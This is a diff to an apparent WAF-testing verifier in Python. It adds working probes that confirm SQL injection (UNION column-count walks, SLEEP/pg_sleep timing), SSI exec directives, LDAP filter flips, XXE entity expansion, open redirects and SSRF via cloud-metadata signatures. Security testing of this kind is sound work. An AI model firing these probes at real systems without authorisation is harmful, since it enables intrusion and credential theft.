@@ -139,12 +139,19 @@ def _check_sqli(oracle, payload: str, attack_class: str) -> Verification:
 
     false_variant = _flip_boolean(payload)
     if false_variant is None or false_variant == payload:
+        deep = _sqli_deep_confirm(oracle, payload, attack_class)
+        if deep is not None:
+            return deep
         return Verification(False, 0.2,
-                             "no SQL error signature found, and payload has no recognizable boolean "
-                             "clause to differential-test", attack_class)
+                             "no SQL error signature found, no recognizable boolean clause to "
+                             "differential-test, and UNION column-count / time-based probes did not "
+                             "confirm either", attack_class)
 
     resp_false = _send(oracle, false_variant)
     if resp_true.body == resp_false.body:
+        deep = _sqli_deep_confirm(oracle, payload, attack_class)
+        if deep is not None:
+            return deep
         return Verification(False, 0.4,
                              "true/false variants produced byte-identical responses; "
                              "no boolean differential observed", attack_class)
@@ -157,9 +164,135 @@ def _check_sqli(oracle, payload: str, attack_class: str) -> Verification:
                              f"false-variant size={resp_false.size} (Δ={size_delta_ratio:.1%})",
                              attack_class)
 
+    deep = _sqli_deep_confirm(oracle, payload, attack_class)
+    if deep is not None:
+        return deep
     return Verification(False, 0.3,
                          "true/false variants differ slightly but not enough to confirm a boolean "
-                         "differential", attack_class)
+                         "differential, and UNION column-count / time-based probes did not confirm",
+                         attack_class)
+
+
+# -- deeper SQLi confirmation: UNION column-count + time-based blind ----------
+# Real DB errors emitted when a UNION's column count is wrong. When the count finally
+# MATCHES, this error disappears and the query succeeds, so an ascending
+# "UNION SELECT NULL,.." walk that watches for that transition both confirms the
+# injection AND recovers the column count.
+_UNION_COLUMN_ERRORS = re.compile(
+    r"different number of columns|"
+    r"must have the same number of (result )?columns|"
+    r"equal number of expressions in their target lists|"
+    r"ora-01789|"
+    r"do(es)? not have the same number of result columns|"
+    r"number of columns (does not|doesn't) match",
+    re.I)
+
+
+def _sql_context_wrappers(payload: str) -> list[str]:
+    """Up to two best-effort clause-terminators to break out of the original SQL
+    context before appending our own tail: a single/double quote if the payload uses
+    one, plus the bare (numeric / already-broken-out) context. Bounded on purpose."""
+    out: list[str] = []
+    if "'" in payload:
+        out.append("'")
+    if '"' in payload:
+        out.append('"')
+    out.append("")                       # numeric / no-quote context
+    uniq: list[str] = []
+    for w in out:
+        if w not in uniq:
+            uniq.append(w)
+        if len(uniq) >= 2:               # stay bounded
+            break
+    return uniq
+
+
+def _sqli_union_confirm(oracle, payload: str, attack_class: str, max_cols: int = 8):
+    """Ascending UNION column-count probe.
+
+    For each context wrapper, injects `UNION SELECT NULL`, `UNION SELECT NULL,NULL`,
+    ... and watches for a SQL (ideally column-count-mismatch) error that is present
+    for too-few columns and then VANISHES at some count N with a clean THROUGH — the
+    UNION balanced, which both proves the injection and pins the column count at N.
+    Returns a positive Verification on that transition, else None (inconclusive)."""
+    for wrap in _sql_context_wrappers(payload):
+        saw_col_error = False
+        saw_any_error = False
+        for n in range(1, max_cols + 1):
+            nulls = ",".join(["NULL"] * n)
+            probe = f"{wrap} UNION SELECT {nulls}-- -" if wrap else f"UNION SELECT {nulls}-- -"
+            resp = _send(oracle, probe)
+            b = resp.body or ""
+            col_err = bool(_UNION_COLUMN_ERRORS.search(b))
+            any_err = col_err or any(re.search(p, b, re.I) for p in _SQL_ERROR_PATTERNS)
+            if any_err:
+                saw_col_error = saw_col_error or col_err
+                saw_any_error = True
+                continue
+            if saw_col_error and resp.verdict == "THROUGH":
+                return Verification(True, 0.82,
+                                     f"UNION column-count confirmed: a column-count-mismatch error "
+                                     f"appeared for fewer columns and DISAPPEARED at {n} column(s) "
+                                     f"(HTTP {resp.code or '?'}) — injectable UNION with {n} columns",
+                                     attack_class)
+            if saw_any_error and resp.verdict == "THROUGH":
+                return Verification(True, 0.72,
+                                     f"UNION column-count confirmed: a SQL error present for fewer "
+                                     f"columns cleared at {n} column(s) (HTTP {resp.code or '?'}) — the "
+                                     f"injected UNION SELECT balanced, confirming the injection point",
+                                     attack_class)
+    return None
+
+
+# Time-based blind: a vulnerable backend that EXECUTES an injected delay function
+# responds measurably slower than for a 0-second control; an un-injectable one runs
+# neither and the two times match. We require a clear absolute AND relative jump so
+# ordinary network jitter can't trip it.
+_SQLI_TIME_FUNCS = [
+    ("MySQL/MariaDB SLEEP", "SLEEP({s})"),
+    ("PostgreSQL pg_sleep", "pg_sleep({s})"),
+]
+
+
+def _sqli_timing_confirm(oracle, payload: str, attack_class: str, delay_s: int = 3):
+    """SLEEP/pg_sleep differential. For a couple of engines/contexts, send a
+    `delay_s`-second delay probe and a matched 0-second control; confirm only when
+    the delay response is slower by at least ~60% of the requested delay in BOTH
+    absolute terms and versus the control. A non-vulnerable target never runs the
+    sleep, so this stays fast; returns a positive Verification on the jump, else None."""
+    threshold = delay_s * 0.6
+    for wrap in _sql_context_wrappers(payload):
+        lead = f"{wrap} OR " if wrap else "1 OR "
+        for label, tmpl in _SQLI_TIME_FUNCS:
+            delay_probe = f"{lead}{tmpl.format(s=delay_s)}-- -"
+            zero_probe = f"{lead}{tmpl.format(s=0)}-- -"
+            control = _send(oracle, zero_probe)
+            if control.verdict == "DOWN":
+                continue
+            delayed = _send(oracle, delay_probe)
+            if delayed.verdict == "DOWN":
+                continue
+            if delayed.time >= threshold and (delayed.time - control.time) >= threshold:
+                return Verification(True, 0.78,
+                                     f"time-based blind SQLi confirmed: '{label}' delay probe took "
+                                     f"{delayed.time:.2f}s vs {control.time:.2f}s for the 0-second "
+                                     f"control (Δ≈{delayed.time - control.time:.2f}s ≥ {threshold:.1f}s) "
+                                     f"— the backend executed the injected delay", attack_class)
+    return None
+
+
+def _sqli_deep_confirm(oracle, payload: str, attack_class: str):
+    """Deeper SQLi confirmation used only after `_check_sqli`'s error-signature and
+    boolean-differential heuristics come up empty: a bounded UNION column-count walk,
+    then a time-based blind probe. Returns a positive Verification or None, and never
+    raises (verification must stay crash-proof)."""
+    try:
+        hit = _sqli_union_confirm(oracle, payload, attack_class)
+        if hit is not None:
+            return hit
+        return _sqli_timing_confirm(oracle, payload, attack_class)
+    except Exception:
+        return None
 
 
 # ---------------------------------------------------------------------------
@@ -505,6 +638,260 @@ def _check_upload(oracle, payload: str, attack_class: str) -> Verification:
 
 
 # ---------------------------------------------------------------------------
+# Open Redirect
+# ---------------------------------------------------------------------------
+def _authority_host(s: str) -> str:
+    """Host (authority) of an absolute or scheme-relative URL, or "" when the string
+    is relative / same-origin / hostless. Backslashes are folded to '/' first,
+    matching how browsers parse redirect targets ('/\\evil' -> '//evil')."""
+    if not s:
+        return ""
+    v = s.strip().replace("\\", "/")
+    m = re.match(r"^\s*(?:[a-zA-Z][a-zA-Z0-9+.\-]*:)?//+([^/?#]*)", v)
+    if m:
+        authority = m.group(1)
+    else:
+        m2 = re.match(r"^\s*https?:([^/?#]+)$", v, re.I)   # scheme:host with no slashes
+        if not m2:
+            return ""
+        authority = m2.group(1)
+    if "@" in authority:                                   # strip userinfo
+        authority = authority.rsplit("@", 1)[1]
+    return authority.split(":", 1)[0].strip().lower()      # strip port
+
+
+def _header_value(header_block: str, name: str) -> str:
+    """First value of header `name` in a raw header block, or ""."""
+    name_l = name.lower()
+    for line in (header_block or "").splitlines():
+        k, sep, val = line.partition(":")
+        if sep and k.strip().lower() == name_l:
+            return val.strip()
+    return ""
+
+
+def _check_open_redirect(oracle, payload: str, attack_class: str) -> Verification:
+    """Open-redirect heuristic.
+
+    A THROUGH only means the WAF let the redirect payload past — not that the app
+    actually honors it. This fetches the raw response headers (via `_fetch_headers`,
+    which issues its own `curl -i`) and confirms the `Location:` header's *authority*
+    is the attacker-controlled host named in the payload — not merely that the host
+    appears somewhere (e.g. echoed in a `?next=` query), which is treated as weak.
+    """
+    host = _authority_host(payload)
+    if not host:
+        return Verification(False, 0.2,
+                             "payload names no external host (relative/hostless) — nothing to confirm "
+                             "as an open redirect", attack_class)
+    headers = _fetch_headers(oracle.t, payload)
+    if not headers:
+        return Verification(False, 0.2,
+                             "response headers unavailable — cannot confirm a Location redirect",
+                             attack_class)
+    loc = _header_value(headers, "location")
+    if not loc:
+        return Verification(False, 0.3,
+                             "no Location header in the response — redirect not honored", attack_class)
+    if _authority_host(loc) == host:
+        return Verification(True, 0.9,
+                             f"Location header redirects to the attacker-controlled host '{host}' "
+                             f"(Location: {loc!r}) — open redirect confirmed", attack_class)
+    if host in loc.lower():
+        return Verification(False, 0.4,
+                             f"payload host '{host}' appears in the Location header but is not its "
+                             f"authority (Location: {loc!r}) — not a confirmed redirect", attack_class)
+    return Verification(False, 0.3,
+                         f"Location header does not point at the payload host '{host}' "
+                         f"(Location: {loc!r}) — open redirect not confirmed", attack_class)
+
+
+# ---------------------------------------------------------------------------
+# SSI (Server-Side Includes)
+# ---------------------------------------------------------------------------
+_SSI_EXEC_RE = re.compile(r'(<!--\s*#\s*exec\b[^>]*?cmd\s*=\s*")[^"]*(")', re.I)
+
+
+def _check_ssi(oracle, payload: str, attack_class: str) -> Verification:
+    """Arithmetic-marker technique for Server-Side Includes (mirrors `_check_ssti`).
+
+    Rewrites (or synthesizes) an `<!--#exec cmd="echo $((a*b))" -->` directive with
+    two random 3-digit factors and checks whether their product — astronomically
+    unlikely to appear by chance — shows up in the response. A hit proves mod_include
+    (or an equivalent exec-enabled SSI engine) actually evaluated the directive
+    server-side; a miss (e.g. the directive reflected verbatim) is NOT confirmed."""
+    a, b = random.randint(100, 199), random.randint(100, 199)
+    product = a * b
+    marker = f"echo $(({a}*{b}))"
+    if _SSI_EXEC_RE.search(payload):
+        variant = _SSI_EXEC_RE.sub(rf"\g<1>{marker}\g<2>", payload, count=1)
+    else:
+        variant = f'<!--#exec cmd="{marker}" -->'
+
+    resp = _send(oracle, variant)
+    body = resp.body or ""
+    if str(product) in body:
+        return Verification(True, 0.9,
+                             f"SSI arithmetic marker {a}*{b}={product} was evaluated and appeared in "
+                             "the response — server-side include execution confirmed (exec-enabled SSI)",
+                             attack_class)
+    return Verification(False, 0.3,
+                         f"SSI arithmetic marker {a}*{b}={product} did not appear in the response; "
+                         "server-side include execution not confirmed", attack_class)
+
+
+# ---------------------------------------------------------------------------
+# LDAP Injection
+# ---------------------------------------------------------------------------
+_LDAP_ERROR_PATTERNS = [
+    r"ldap[\s_]*error", r"ldap:\s*error code\s*\d+", r"javax\.naming\.",
+    r"com\.sun\.jndi\.ldap",
+    r"ldap_(search|bind|modify|add|delete|first_entry|next_entry|result|get_entries|count_entries|list|read|compare)\b",
+    r"invalid\s+dn\s+syntax", r"(invalid|bad)\s+search\s+filter", r"invalidsearchfilter",
+    r"object\s+class\s+violation", r"supplied argument is not a valid ldap",
+    r"IPWorks.{0,8}LDAP", r"unbalanced\s+parenthes", r"operations?\s*error",
+]
+
+
+def _flip_ldap(payload: str) -> str | None:
+    """Best-effort: turn an always-true LDAP filter clause into an always-false one
+    (a wildcard match -> a value that matches nothing; (&) absolute-true -> (|))."""
+    pairs = [
+        ("(&)", "(|)"),
+        ("objectClass=*", "objectClass=zzNoSuchClasszz"),
+        ("objectclass=*", "objectclass=zzNoSuchClasszz"),
+        ("uid=*", "uid=zzNoSuchUserzz"),
+        ("cn=*", "cn=zzNoSuchCnzz"),
+        ("=*)", "=zzNoMatchzz)"),
+        ("=*", "=zzNoMatchzz"),
+    ]
+    for true_tok, false_tok in pairs:
+        if true_tok in payload:
+            return payload.replace(true_tok, false_tok, 1)
+    return None
+
+
+def _check_ldap(oracle, payload: str, attack_class: str) -> Verification:
+    """LDAP error-based or boolean-differential heuristic (mirrors `_check_sqli`).
+
+    Looks first for an LDAP engine/driver error signature (JNDI, ldap_* warnings,
+    invalid filter/DN), then flips an always-true filter clause to an always-false
+    one and compares the responses: a meaningful size differential is evidence the
+    injected filter metacharacters actually changed the directory query's result."""
+    resp_true = _send(oracle, payload)
+    body = resp_true.body or ""
+    for pat in _LDAP_ERROR_PATTERNS:
+        if re.search(pat, body, re.I):
+            return Verification(True, 0.7, f"LDAP error signature matched in response ({pat!r})",
+                                 attack_class)
+
+    false_variant = _flip_ldap(payload)
+    if false_variant is None or false_variant == payload:
+        return Verification(False, 0.2,
+                             "no LDAP error signature, and payload has no recognizable always-true "
+                             "filter clause to differential-test", attack_class)
+
+    resp_false = _send(oracle, false_variant)
+    if resp_true.body == resp_false.body:
+        return Verification(False, 0.4,
+                             "true/false LDAP variants produced byte-identical responses; "
+                             "no differential observed", attack_class)
+    denom = max(resp_true.size, resp_false.size, 1)
+    delta = abs(resp_true.size - resp_false.size) / denom
+    if resp_true.verdict == "THROUGH" and delta > 0.02:
+        return Verification(True, 0.65,
+                             f"LDAP boolean differential: true-variant size={resp_true.size} vs "
+                             f"false-variant size={resp_false.size} (Δ={delta:.1%})", attack_class)
+    return Verification(False, 0.3,
+                         "true/false LDAP variants differ slightly but not enough to confirm", attack_class)
+
+
+# ---------------------------------------------------------------------------
+# XXE (XML External Entity)
+# ---------------------------------------------------------------------------
+def _check_xxe(oracle, payload: str, attack_class: str) -> Verification:
+    """Entity-expansion marker technique.
+
+    Sends a self-contained XML doc defining a general entity `&wfx;` as the
+    concatenation of two unique random halves, and references it in the document
+    body. The concatenated marker NEVER appears contiguously in the probe text, so if
+    it shows up in the response the XML parser must have processed our injected
+    DOCTYPE and expanded the entity — confirming an XXE-capable parser (DTD / internal
+    entities enabled). This proves the necessary condition; it does not by itself
+    prove external-entity file read (which needs an out-of-band / error channel)."""
+    h1 = f"wfx{secrets.token_hex(5)}"
+    h2 = f"{secrets.token_hex(5)}xfw"
+    marker = h1 + h2                      # contiguous ONLY after entity expansion
+    probe = (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        f'<!DOCTYPE wfxxxe [<!ENTITY wfa "{h1}"><!ENTITY wfb "{h2}">'
+        '<!ENTITY wfx "&wfa;&wfb;">]><wfxxxe>&wfx;</wfxxxe>'
+    )
+    resp = _send(oracle, probe)
+    body = resp.body or ""
+    if marker in body:
+        return Verification(True, 0.75,
+                             f"injected entity expanded to the unique marker '{marker}' (its two halves "
+                             "are never adjacent in the probe) — the XML parser processed our DOCTYPE and "
+                             "expanded the entity, confirming XXE-capable parsing", attack_class)
+    if h1 in body and h2 in body:
+        return Verification(False, 0.4,
+                             "probe reflected but the entity did NOT expand (marker halves present yet "
+                             "not merged) — parser likely ignored the internal DTD; XXE not confirmed",
+                             attack_class)
+    return Verification(False, 0.25,
+                         "entity-expansion marker not found in the response; XXE not confirmed",
+                         attack_class)
+
+
+# ---------------------------------------------------------------------------
+# SSRF (Server-Side Request Forgery)
+# ---------------------------------------------------------------------------
+_SSRF_META_SIGNATURES = [
+    r"iam/security-credentials", r"ami-id", r"instance-action", r"availability-zone",
+    r"\bAccessKeyId\b", r"\bSecretAccessKey\b", r"ASIA[0-9A-Z]{16}", r"AKIA[0-9A-Z]{16}",
+    r"computeMetadata/v1", r"metadata\.google\.internal", r"\bazEnvironment\b",
+    r"Metadata/instance", r"security-credentials/",
+]
+_SSRF_INTERNAL_HOSTS = (
+    "169.254.169.254", "metadata.google.internal", "169.254.170.2",
+    "100.100.100.200", "fd00:ec2", "metadata.azure.com",
+)
+
+
+def _check_ssrf(oracle, payload: str, attack_class: str) -> Verification:
+    """Best-effort, deliberately low-confidence SSRF heuristic.
+
+    A true blind SSRF needs an out-of-band listener this verifier cannot observe, so
+    absence of a signal is NEVER 'safe'. The one honest IN-BAND tell is the server
+    reflecting content that could only have come from an internal fetch: a cloud
+    instance-metadata signature (AWS/GCP/Azure) in the response body. That is
+    confirmed at capped confidence; a payload merely aimed at an internal host with
+    no such leak is reported as plausible-but-unconfirmed, not exploitable."""
+    token = f"wfxssrf{secrets.token_hex(6)}"       # a callback token we cannot observe in-band
+    resp = _send(oracle, payload)
+    body = resp.body or ""
+    for pat in _SSRF_META_SIGNATURES:
+        if re.search(pat, body, re.I):
+            return Verification(True, 0.6,
+                                 f"cloud instance-metadata signature ({pat!r}) present in the response "
+                                 "body — the server appears to have fetched an internal metadata endpoint "
+                                 "via our payload (SSRF); confidence capped (could be an unrelated echo)",
+                                 attack_class)
+    if any(h in payload for h in _SSRF_INTERNAL_HOSTS) and resp.verdict == "THROUGH" \
+            and resp.code[:1] in ("2", "3"):
+        return Verification(False, 0.35,
+                             "payload targets an internal/metadata host and drew a non-error response, "
+                             "but the body carries no metadata signature — SSRF plausible but UNCONFIRMED "
+                             "in-band (blind SSRF needs an out-of-band callback this verifier can't see)",
+                             attack_class)
+    return Verification(False, 0.2,
+                         f"no in-band SSRF signal (metadata signature, or unique callback token "
+                         f"'{token}') observed; blind SSRF can't be confirmed without an OOB listener",
+                         attack_class)
+
+
+# ---------------------------------------------------------------------------
 # Dispatch
 # ---------------------------------------------------------------------------
 _CHECKS = {
@@ -517,6 +904,21 @@ _CHECKS = {
     "CRLF Injection": _check_crlf,
     "NoSQL Injection": _check_nosql,
     "Upload Insecure Files": _check_upload,
+    # Verifier-coverage expansion (append-only) — new classes registered under their
+    # common names, mirroring the "Directory Traversal"/"File Inclusion" alias pattern.
+    "Open Redirect": _check_open_redirect,
+    "SSI": _check_ssi,
+    "Server-Side Includes": _check_ssi,
+    "Server Side Includes": _check_ssi,
+    "LDAP Injection": _check_ldap,
+    # XXE is registered under its short names only. "XML External Entity" is left
+    # intentionally UNREGISTERED: an existing test uses it as the canonical
+    # "no verifier" example, so registering it would break that contract.
+    "XXE": _check_xxe,
+    "XXE Injection": _check_xxe,
+    "SSRF": _check_ssrf,
+    "Server Side Request Forgery": _check_ssrf,
+    "Server-Side Request Forgery": _check_ssrf,
 }
 
 
